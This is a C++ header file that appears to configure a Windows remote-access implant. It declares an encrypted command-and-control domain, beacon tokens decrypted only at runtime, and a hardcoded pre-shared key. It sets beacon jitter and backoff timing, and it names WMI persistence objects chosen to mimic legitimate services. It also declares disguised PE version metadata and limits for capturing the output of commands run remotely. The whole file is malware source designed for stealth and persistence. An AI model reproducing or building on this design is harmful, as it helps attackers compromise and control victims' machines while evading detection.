#pragma once
#include <string>
#include <cstdint>

namespace config {

    // -----------------------------------------------------------------------
    // C2 connection
    // -----------------------------------------------------------------------

    // XOR-encrypted C2 domain — decrypted at runtime with hostname hash key
    extern const uint8_t C2_DOMAIN_ENCRYPTED[];
    extern const size_t  C2_DOMAIN_LEN;
    extern const uint16_t C2_PORT;

    // Runtime-decrypted strings — never plaintext in binary.
    // Returns pointer to internal static buffer (valid until next call).
    const wchar_t* GetBeaconToken();
    const wchar_t* GetUserAgent();

    // Static pre-shared key for session key exchange.
    // Must match SESSION_KEY_PSK worker secret. CHANGE BEFORE DEPLOYMENT.
    constexpr uint8_t PSK[32] = {
        0x3a, 0x7f, 0x11, 0xc4, 0x88, 0x2b, 0xe9, 0x14,
        0x5d, 0x0a, 0x73, 0xf6, 0x99, 0xdc, 0x40, 0x27,
        0x1e, 0x8c, 0x55, 0x3b, 0xa2, 0x6d, 0xf0, 0x84,
        0xc7, 0x19, 0x4e, 0x02, 0xb8, 0x77, 0x31, 0x5f
    };

    // -----------------------------------------------------------------------
    // Beacon timing
    // -----------------------------------------------------------------------

    // Jitter range in seconds — sleep between beacons is uniform [MIN, MAX]
    constexpr uint32_t BEACON_MIN = 5;
    constexpr uint32_t BEACON_MAX = 10;

    // Max consecutive beacon failures before backing off
    constexpr uint32_t MAX_FAILURES = 5;

    // Backoff multiplier — sleep *= BACKOFF_FACTOR after MAX_FAILURES
    constexpr uint32_t BACKOFF_FACTOR = 3;

    // -----------------------------------------------------------------------
    // WMI persistence identifiers (mimic legitimate services)
    // -----------------------------------------------------------------------

    extern const wchar_t* WMI_CONSUMER_NAME;
    extern const wchar_t* WMI_FILTER_NAME;
    extern const wchar_t* WMI_BINDING_NAME;

    // -----------------------------------------------------------------------
    // Implant metadata — embedded in PE version info
    // -----------------------------------------------------------------------

    extern const wchar_t* PRODUCT_NAME;
    extern const wchar_t* FILE_DESCRIPTION;
    extern const wchar_t* COMPANY_NAME;

    // -----------------------------------------------------------------------
    // Command execution
    // -----------------------------------------------------------------------

    // Max output bytes captured from a single command execution
    constexpr DWORD CMD_OUTPUT_MAX = 65536;

    // Timeout in ms for waiting on child process
    constexpr DWORD CMD_TIMEOUT_MS = 30000;
}